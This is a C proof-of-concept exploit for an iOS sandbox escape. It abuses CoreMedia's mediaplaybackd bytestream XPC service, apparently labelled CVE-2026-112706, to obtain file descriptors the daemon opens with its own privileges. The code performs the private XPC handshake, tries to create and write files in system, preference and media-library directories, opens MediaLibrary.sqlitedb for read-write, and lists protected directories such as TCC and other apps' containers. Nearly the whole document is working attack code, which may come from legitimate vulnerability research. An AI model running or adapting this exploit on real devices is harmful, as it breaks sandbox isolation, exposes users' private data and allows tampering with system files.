/*
 * probe_fdleak.c — CVE-2026-112706: CoreMedia mediaplaybackd bytestream XPC, fd vend.
 *
 * mediaplaybackd открывает клиентский file:// путь СВОИМИ правами и отдаёт живой fd
 * в ByteStreamDetails.FileDescriptor. I/O по дескриптору не проходит проверки путей
 * песочницы клиента -> файл, который приложение не может open(), читается.
 *
 * Handshake: '.rp1' -> '.rp2' (memory recipient) -> '.org' (memory origin), затем
 * 'Curl' create с CreationURL. Всё через dlsym: CoreMedia (Fig*) + libxpc.
 *
 * Отчёт: syslog + <HOME>/Documents/probe_fdwrite3.log
 */

/* uint types — avoid size_t conflict with SDK headers */
typedef unsigned char uint8_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef long long int64_t;
typedef int int32_t;
typedef unsigned long long size_t;
typedef void *xpc_object_t;
typedef void *CFURLRef;
typedef void *CFAllocatorRef;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern int open(const char *, int, ...);
extern int close(int);
extern long pread(int, void *, unsigned long, long long);
extern int fstat(int, void *);
extern char *getenv(const char *);
extern int *__error(void);
extern void syslog(int, const char *, ...);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_join(void *, void **);
extern void free(void *);
extern int unlink(const char *);
extern void *malloc(size_t);
extern void free(void *);
extern void *fdopendir(int);
extern void *readdir(void *);
extern int closedir(void *);
extern unsigned long long mach_absolute_time(void);
extern int mkdir(const char *, unsigned int);
extern long write(int, const void *, unsigned long);
extern int fcntl(int, int, ...);

#define NULL ((void *)0)
#define RTLD_NOW 2
#define RTLD_DEFAULT ((void *)-2)
#define O_RDONLY 0x0000
#define O_WRONLY 0x0001
#define O_CREAT 0x0200
#define O_APPEND 0x0008   /* Darwin: O_NONBLOCK=0x4 */

/* Fig* ABI (из FdLeak.swift / Cinder27) */
typedef int32_t (*fn_basic_msg)(uint32_t, uint64_t, void **);
typedef int32_t (*fn_origin_begin)(void *);
typedef int32_t (*fn_origin_complete)(void *, void **);
typedef int32_t (*fn_recipient)(void *, void *, const char *, void **);
typedef int32_t (*fn_set_cfurl)(void *, const char *, CFURLRef);

/* libxpc ABI */
typedef void *(*fn_conn_create)(const char *, void *, uint64_t);
typedef void (*fn_resume)(void *);
typedef void *(*fn_send_sync)(void *, void *);
typedef void *(*fn_dict_get_value)(void *, const char *);
typedef uint64_t (*fn_dict_get_u64)(void *, const char *);
typedef void (*fn_dict_set_u64)(void *, const char *, uint64_t);
typedef int32_t (*fn_dict_dup_fd)(void *, const char *);
typedef int64_t (*fn_dict_get_i64)(void *, const char *);
typedef void (*fn_release)(void *);
typedef const char *(*fn_copy_description)(void *);
typedef void *(*fn_get_type)(void *);
typedef const char *(*fn_type_get_name)(void *);
typedef int32_t (*fn_pipe_create)(void *, uint64_t *);
typedef void    (*fn_set_event_handler)(void *, void *);
typedef void    (*fn_send_with_reply)(void *, void *, void *, void *);
typedef void   *(*fn_retain)(void *);

typedef void *dispatch_semaphore_t;
extern dispatch_semaphore_t dispatch_semaphore_create(long);
extern long dispatch_semaphore_wait(dispatch_semaphore_t, unsigned long long);
extern long dispatch_semaphore_signal(dispatch_semaphore_t);
extern void dispatch_release(void *);

#define DISPATCH_TIME_NOW 0ull
#define SIX_SECONDS_NS 6000000000ull

/* CoreFoundation */
typedef CFURLRef (*fn_cfurl_create_fs)(CFAllocatorRef, const uint8_t *, long, int);

static fn_basic_msg          p_basic_msg;
static fn_origin_begin       p_origin_begin;
static fn_origin_complete    p_origin_complete;
static fn_recipient          p_recipient;
static fn_set_cfurl          p_set_cfurl;
static fn_conn_create        p_conn_create;
static fn_resume             p_resume;
static fn_send_sync          p_send_sync;
static fn_dict_get_value     p_dict_get_value;
static fn_dict_get_u64       p_dict_get_u64;
static fn_dict_set_u64       p_dict_set_u64;
static fn_dict_dup_fd        p_dict_dup_fd;
static fn_dict_get_i64       p_dict_get_i64;
static fn_release            p_release;
static fn_copy_description   p_copy_description;
static fn_type_get_name      p_type_get_name;
static fn_get_type           p_get_type;
static fn_cfurl_create_fs    p_cfurl;
static fn_set_event_handler  p_set_event_handler;
static fn_send_with_reply    p_send_with_reply;
static fn_retain             p_retain;

static char g_log[600];

static void report(const char *fmt, ...) {
    char buf[900];
    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);
    int n = __builtin_vsnprintf(buf, sizeof(buf), fmt, ap);
    __builtin_va_end(ap);
    if (n <= 0) return;
    if (n > (int)sizeof(buf) - 1) n = (int)sizeof(buf) - 1;
    syslog(1, "%s", buf);
    int fd = open(g_log, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd >= 0) {
        extern long write(int, const void *, unsigned long);
        write(fd, buf, (unsigned long)n);
        write(fd, "\n", 1);
        close(fd);
    }
}

/* ---------------- bind ---------------- */
static int bind_all(void) {
    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW);
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
    void *rt = RTLD_DEFAULT;
    if (!cm || !cf) { report("fdleak: dlopen CoreMedia=%p CF=%p", cm, cf); return 0; }

    p_basic_msg       = (fn_basic_msg)dlsym(cm, "FigXPCCreateBasicMessage");
    p_origin_begin    = (fn_origin_begin)dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
    p_origin_complete = (fn_origin_complete)dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
    p_recipient       = (fn_recipient)dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
    p_set_cfurl       = (fn_set_cfurl)dlsym(cm, "FigXPCMessageSetCFURL");

    p_conn_create   = (fn_conn_create)dlsym(rt, "xpc_connection_create_mach_service");
    p_resume        = (fn_resume)dlsym(rt, "xpc_connection_resume");
    p_send_sync     = (fn_send_sync)dlsym(rt, "xpc_connection_send_message_with_reply_sync");
    p_dict_get_value= (fn_dict_get_value)dlsym(rt, "xpc_dictionary_get_value");
    p_dict_get_u64  = (fn_dict_get_u64)dlsym(rt, "xpc_dictionary_get_uint64");
    p_dict_set_u64  = (fn_dict_set_u64)dlsym(rt, "xpc_dictionary_set_uint64");
    p_dict_dup_fd   = (fn_dict_dup_fd)dlsym(rt, "xpc_dictionary_dup_fd");
    p_dict_get_i64  = (fn_dict_get_i64)dlsym(rt, "xpc_dictionary_get_int64");
    p_release       = (fn_release)dlsym(rt, "xpc_release");
    p_copy_description = (fn_copy_description)dlsym(rt, "xpc_copy_description");
    p_type_get_name = (fn_type_get_name)dlsym(rt, "xpc_type_get_name");
    p_get_type      = (fn_get_type)dlsym(rt, "xpc_get_type");
    p_cfurl         = (fn_cfurl_create_fs)dlsym(cf, "CFURLCreateFromFileSystemRepresentation");
    p_set_event_handler = (fn_set_event_handler)dlsym(rt, "xpc_connection_set_event_handler");
    p_send_with_reply   = (fn_send_with_reply)dlsym(rt, "xpc_connection_send_message_with_reply");
    p_retain            = (fn_retain)dlsym(rt, "xpc_retain");

    if (!p_basic_msg || !p_origin_begin || !p_origin_complete || !p_recipient || !p_set_cfurl ||
        !p_conn_create || !p_resume || !p_send_sync || !p_dict_get_value || !p_dict_dup_fd ||
        !p_cfurl) {
        report("fdleak: dlsym fail basic=%p begin=%p comp=%p recip=%p url=%p conn=%p send=%p dupfd=%p cfurl=%p",
               (void*)p_basic_msg, (void*)p_origin_begin, (void*)p_origin_complete, (void*)p_recipient,
               (void*)p_set_cfurl, (void*)p_conn_create, (void*)p_send_sync, (void*)p_dict_dup_fd, (void*)p_cfurl);
        return 0;
    }
    return 1;
}

static const char *type_name(void *o) {
    if (!o || !p_get_type || !p_type_get_name) return "?";
    void *t = p_get_type(o);
    const char *n = p_type_get_name(t);
    return n ? n : "?";
}

static volatile int g_reply_flag;
static void *g_reply_obj;

static void *send_msg(void *conn, void *msg) {
    if (!msg) return NULL;
    /* синхронный вариант теперь безопасен: прогон идёт на отдельном потоке */
    if (p_send_sync) {
        void *reply = p_send_sync(conn, msg);
        if (reply) return reply;
    }
    if (!p_send_with_reply) return NULL;
    g_reply_obj = NULL;
    g_reply_flag = 0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    void (^handler)(void *) = ^(void *obj) {
        if (obj) {
            const char *tn = type_name(obj);
            if (tn && (tn[0] == 'd' || (tn[0] == 'e' && tn[1] == 'r'))) {
                if (p_retain) p_retain(obj);
                g_reply_obj = obj;
            }
            g_reply_flag = 1;
        }
        dispatch_semaphore_signal(sem);
    };
    p_send_with_reply(conn, msg, NULL, (void *)handler);
    if (dispatch_semaphore_wait(sem, SIX_SECONDS_NS) != 0) {
        report("fdleak: reply timeout (no answer in 6s)");
        return NULL;
    }
    return g_reply_obj;
}

/* ---------------- handshake ---------------- */
static int g_established = 0;
static char g_hs[256];

static void handshake(void *conn) {
    char *log = g_hs;
    int p = 0;

    /* '.rp1' */
    void *m1 = NULL;
    int32_t st = p_basic_msg(0x2E727031, 0, &m1);
    if (st == 0 && m1) {
        void *r1 = send_msg(conn, m1);
        p_release(m1);
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp1:%s ", type_name(r1));
        if (r1 && type_name(r1)[0] == 'd') {
            /* '.rp2' + memory recipient */
            void *m2 = NULL;
            if (p_basic_msg(0x2E727032, 0, &m2) == 0 && m2) {
                void *recip = NULL;
                int32_t cr = p_recipient(r1, m2, "kc27probe", &recip);
                void *r2 = send_msg(conn, m2);
                p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp2(recip=%d):%s ", cr, type_name(r2));
                if (r2) p_release(r2);
                p_release(m2);
            }
            p_release(r1);
        } else if (r1) {
            p_release(r1);
        }
    } else {
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp1-fail st=%d ", st);
    }

    /* '.org' — memory origin; cp == 0 => established */
    void *om = NULL;
    if (p_basic_msg(0x2E6F7267, 0, &om) == 0 && om) {
        int32_t bg = p_origin_begin(om);
        void *or_ = send_msg(conn, om);
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "org(begin=%d):%s ", bg, type_name(or_));
        if (or_) {
            if (type_name(or_)[0] == 'd') {
                void *origin = NULL;
                int32_t cp = p_origin_complete(or_, &origin);
                g_established = (cp == 0);
                p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "complete=%d est=%d", cp, g_established);
            }
            p_release(or_);
        }
        p_release(om);
    }
    log[p] = 0;
}

/* ---------------- vend ---------------- */
typedef struct {
    int ok;
    int fd;
    uint64_t object_id, entire_length, server_pid;
    int64_t error_code;
    long long size;
    uint32_t mode;
    int is_dir;
} vend_t;

static vend_t vend(void *conn, const char *path, uint64_t opts) {
    vend_t v;
    uint8_t *raw = (uint8_t *)&v;
    for (unsigned i = 0; i < sizeof(v); i++) raw[i] = 0;
    v.fd = -1;

    CFURLRef url = p_cfurl(NULL, (const uint8_t *)path, (long)__builtin_strlen(path), 0);
    if (!url) { v.error_code = -999; return v; }

    void *m = NULL;
    if (p_basic_msg(0x4375726C, 0, &m) != 0 || !m) { v.error_code = -998; return v; }
    p_set_cfurl(m, "CreationURL", url);
    if (p_dict_set_u64) p_dict_set_u64(m, "FileOpenOptions", opts);

    void *reply = send_msg(conn, m);
    p_release(m);

    if (!reply) { v.error_code = -997; return v; }
    if (type_name(reply)[0] != 'd') { v.error_code = -996; p_release(reply); return v; }

    void *details = p_dict_get_value(reply, "ByteStreamDetails");
    if (!details) {
        v.error_code = p_dict_get_i64 ? p_dict_get_i64(reply, ".ErrorReturn") : -995;
        p_release(reply);
        return v;
    }

    v.object_id = p_dict_get_u64(details, "ObjectID");
    v.entire_length = p_dict_get_u64(details, "EntireLength");
    v.server_pid = p_dict_get_u64(details, "ServerPID");

    int fd = p_dict_dup_fd(details, "FileDescriptor");
    p_release(reply);
    if (fd < 0) { v.error_code = -994; return v; }

    /* fstat без заголовков: только st_mode (offset 4) и st_size (offset 104 на arm64 Darwin) */
    uint8_t stbuf[256];
    for (unsigned i = 0; i < sizeof(stbuf); i++) stbuf[i] = 0;
    if (fstat(fd, stbuf) == 0) {
        uint32_t mode = *(uint32_t *)(stbuf + 4);
        long long size = *(long long *)(stbuf + 104);
        v.mode = mode;
        v.size = size;
        v.is_dir = ((mode & 0170000) == 0040000);
    }
    v.fd = fd;
    v.ok = 1;
    return v;
}

/* ---------------- targets: fresh-name write matrix ---------------- */
/* opts: O_WRONLY=1, O_CREAT=0x200, O_EXCL=0x800 => 0xA01 (create a NEW file). */
static char g_own_dir[600];
static char g_fname_a[64];
static char g_fname_b[64];

typedef struct {
    const char *label;
    const char *dir;      /* directory, or a full path when fname == NULL */
    const char *fname;    /* NULL => dir is the full path */
    uint64_t opts;
    const char *pclass;   /* own | tmp | media | system | root */
    int write_ok;
    int created;
    int precreate;        /* create via direct open() first (control) */
} target_t;

static target_t g_targets[] = {
    /* control: file exists, vended O_RDONLY, write() must fail with EBADF */
    {"ctl_rdonly",   g_own_dir, g_fname_a, 0x000, "own",    1, 1, 1},
    /* baseline: bytestream creates a NEW file in our own container */
    {"own_wronly",   g_own_dir, g_fname_b, 0xA01, "own",    1, 1, 0},
    {"var_tmp",      "/private/var/tmp", g_fname_b, 0xA01, "tmp", 1, 1, 0},
    {"media_root",   "/private/var/mobile/Media", g_fname_b, 0xA01, "media", 1, 1, 0},
    {"itunes_dir",   "/private/var/mobile/Media/iTunes_Control/iTunes", g_fname_b, 0xA01, "media", 1, 1, 0},
    {"prefs_dir",    "/private/var/mobile/Library/Preferences", g_fname_b, 0xA01, "system", 1, 1, 0},
    {"etc_dir",      "/private/etc", g_fname_b, 0xA01, "root", 1, 1, 0},
    /* fcntl only: does an EXISTING readable file open for write (no write into it) */
    {"mlib_rdwr",    "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb", NULL, 0x002, "media", 0, 0, 0},
    {"mlib_rdonly",  "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb", NULL, 0x000, "media", 0, 0, 0},
    /* the file we leaked in round 1: write into an EXISTING foreign-readable db copy */
    {"cache_mpd",  "/private/var/mobile/Library/Caches", g_fname_b, 0xA01, "system", 1, 1, 0},
    {"db_copy",     "/private/var/mobile/Media/iTunes_Control/iTunes", g_fname_b, 0xA01, "media", 1, 1, 0},
    {"mlib_copy",    "/private/var/mobile/Media/iTunes_Control/iTunes/kc27copy.sqlitedb", NULL, 0xA01, "media", 1, 1, 0},
};

static int g_rc = 1;

static void *probe_thread(void *arg) {
    (void)arg;
    const char *home = getenv("HOME");
    unsigned long i = 0;
    while (home && home[i] && i < 400) { g_log[i] = home[i]; i++; }
    const char *sfx = "/Documents/probe_fdwrite3.log";
    for (unsigned long k = 0; sfx[k]; k++) g_log[i++] = sfx[k];
    g_log[i] = 0;
    unlink(g_log);   /* свой лог чистим сами: house_arrest rm ненадёжен */

    /* own container dir + unique file names for this run */
    {
        const char *h = getenv("HOME");
        unsigned long n = 0, k = 0;
        while (h && h[n] && n < 500) n++;
        while (k < n) { g_own_dir[k] = h[k]; k++; }
        const char *sfx = "/Documents";
        for (unsigned long q = 0; sfx[q]; q++) g_own_dir[k++] = sfx[q];
        g_own_dir[k] = 0;
        unsigned long long t0 = mach_absolute_time();
        __builtin_snprintf(g_fname_a, sizeof(g_fname_a), "kc27w_%llu_a.txt", t0);
        __builtin_snprintf(g_fname_b, sizeof(g_fname_b), "kc27w_%llu_b.txt", t0);
    }
    report("fdwrite3: start t=%llu", mach_absolute_time());
    if (!bind_all()) { report("fdwrite3: bind failed"); g_rc = 1; return NULL; }

    void *conn = p_conn_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    report("fdwrite3: connection=%p", conn);
    if (!conn) { report("fdwrite3: no connection"); g_rc = 1; return NULL; }
    if (p_set_event_handler) {
        void (^eh)(void *) = ^(void *obj) {
            if (!obj) { report("fdleak: conn event nil"); return; }
            const char *tn = type_name(obj);
            report("fdleak: conn event type=%s", tn ? tn : "?");
        };
        p_set_event_handler(conn, (void *)eh);
    }
    p_resume(conn);

    handshake(conn);
    report("fdwrite3: handshake %s established=%d", g_hs, g_established);

    int vended = 0, denied = 0, bytes = 0;
    unsigned wattempted = 0, wok = 0;
    char act[300];

    for (unsigned t = 0; t < sizeof(g_targets) / sizeof(g_targets[0]); t++) {
        const target_t *tg = &g_targets[t];
        char path[700];
        if (tg->fname) {
            __builtin_snprintf(path, sizeof(path), "%s/%s", tg->dir, tg->fname);
        } else {
            __builtin_snprintf(path, sizeof(path), "%s", tg->dir);
        }

        int e = 0;
        if (tg->precreate) {
            int pc = open(path, (int)(tg->opts | 0x201), 0600);
            if (pc >= 0) { close(pc); e = 0; } else { e = *__error(); }
        }
        /* direct control open (never O_CREAT unless precreate was asked) */
        int cfd = open(path, (int)(tg->opts & ~0x200ULL), 0600);
        if (cfd >= 0) { close(cfd); e = 0; } else { int ce = *__error(); if (!e) e = ce; }

        vend_t v = vend(conn, path, tg->opts);
        if (!v.ok) {
            report("W|%s|%s|opts=0x%llx|direct_errno=%d|REFUSED code=%lld",
                   tg->label, tg->pclass, (unsigned long long)tg->opts, e,
                   (long long)v.error_code);
            if (tg->created) { unlink(path); }
            continue;
        }
        vended++;
        int fl = fcntl(v.fd, 3);      /* F_GETFL: rdonly=0, wronly=1, rdwr=2 */
        long wr = -1;
        int we = 0;
        if (tg->write_ok) {
            wattempted++;
            wr = write(v.fd, "KC27WRITE\n", 10);
            we = (wr < 0) ? *__error() : 0;
            if (wr == 10) wok++;
        }
        report("W|%s|%s|opts=0x%llx|direct_errno=%d|fd=%d|fl=0x%x|wr=%ld|w_errno=%d|size=%lld",
               tg->label, tg->pclass, (unsigned long long)tg->opts, e, v.fd, fl, wr, we, v.size);

        if (wr == 10) {
            vend_t r2 = vend(conn, path, 0);
            if (r2.ok) {
                char buf[16];
                long g = pread(r2.fd, buf, 10, 0);
                int same = (g >= 10 && buf[0] == 'K' && buf[1] == 'C' && buf[2] == '2' && buf[3] == '7');
                report("W|%s|READBACK n=%ld match=%d", tg->label, g, same);
                close(r2.fd);
            } else {
                report("W|%s|READBACK refused code=%lld", tg->label, (long long)r2.error_code);
            }
        }
        close(v.fd);
        if (tg->created) {
            int urc = unlink(path);
            int ue = (urc == 0) ? 0 : *__error();
            report("W|%s|CLEANUP unlink=%d errno=%d", tg->label, urc, ue);
        }
    }

    static const char *dirs[] = {
        "/private/var/mobile/Media",
        "/private/var/mobile/Library",
        "/private/var/mobile/Library/TCC",
        "/private/var/mobile/Containers/Data/Application",
        "/System/Library/CoreServices",
        "/private/var/mobile/Media/iTunes_Control/iTunes",
    };
    for (unsigned di = 0; di < sizeof(dirs) / sizeof(dirs[0]); di++) {
        vend_t v = vend(conn, dirs[di], 0);
        if (!v.ok) { report("DIR %s: refused code=%lld", dirs[di], (long long)v.error_code); continue; }
        if (!v.is_dir) { report("DIR %s: not a directory", dirs[di]); close(v.fd); continue; }
        void *dp = fdopendir(v.fd);
        if (!dp) { report("DIR %s: fdopendir failed", dirs[di]); close(v.fd); continue; }
        int n = 0;
        char names[200];
        int np = 0;
        void *de;
        while ((de = readdir(dp)) != NULL) {
            char *nm = (char *)de + 10;   /* Darwin arm64 dirent: d_name @ +10 */
            if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
            n++;
            if (n <= 10 && np < 170) {
                for (int k = 0; nm[k] && np < 180; k++) names[np++] = nm[k];
                names[np++] = ' ';
            }
        }
        names[np] = 0;
        report("DIR %s: %d entries | %s", dirs[di], n, names);
        closedir(dp);
    }

    __builtin_snprintf(act, sizeof(act), "vended=%d write_attempted=%u write_ok=%u est=%d",
                       vended, wattempted, (unsigned)wok, g_established);
    report("METRIC|L_s2c_fdwrite|write through bytestream|%s|%s",
           act, (wok > 0) ? "WRITE_OK" : "WRITE_DENIED");
    report("fdwrite3: done");
    p_release(conn);
    g_rc = (wok > 0) ? 2 : 0;
    return NULL;
}

int main(void) {
    void *th = 0;
    if (pthread_create(&th, NULL, probe_thread, NULL) != 0) return 1;
    pthread_join(th, NULL);
    return g_rc;
}